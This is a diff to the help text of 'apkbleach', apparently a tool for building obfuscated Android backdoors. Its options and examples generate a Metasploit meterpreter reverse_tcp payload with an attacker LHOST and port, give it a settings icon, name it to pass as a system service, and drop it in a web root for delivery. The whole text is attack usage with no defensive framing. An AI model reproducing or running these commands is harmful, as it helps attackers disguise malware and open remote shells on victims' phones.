@@ -8,20 +8,28 @@ Usage:
 
          Usage: apkbleach -g <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use> -i <path/to/image.png> -o  <path/to/outputname.apk>
 
-Options:
+options: 
 
-        -o  <outputname.apk>        Sets the name of custom output file
+  -g <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use>
+      Generates obfuscated payload with nops
   
-        -i  <path/to/image.png>     Sets image.png as the icon of the file.apk
+  -i <path/to/image.png> [ use -i --list ] to list defaults
+      Sets image as the icon of the file.apk
   
-        -h                          Help menu
+  -o  <path/to/outputname.apk>
+      Sets the name of custom output file
+  
+  -x <path/to/apk>
+      Uses pre generated metasploit payload to obfuscate
+  
+  -h  Help menu
 
 Examples: 
 
-         apkbleach /root/backdoor.apk
+         ./apkbleach -g android/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444
 
-         apkbleach /root/backdoor.apk -o AndroidServices.apk
+         ./apkbleach -x /root/msf.apk
 
-         apkbleach /root/backdoor.apk -o AndroidServices.apk -i /root/settings.png
+         ./apkbleach -g android/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -i ICONS/settings.png 
 
-         apkbleach /root/backdoor.apk -i /root/settings.png
+         ./apkbleach -g android/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -i ICONS/settings.png -o /var/www/html/service.apk
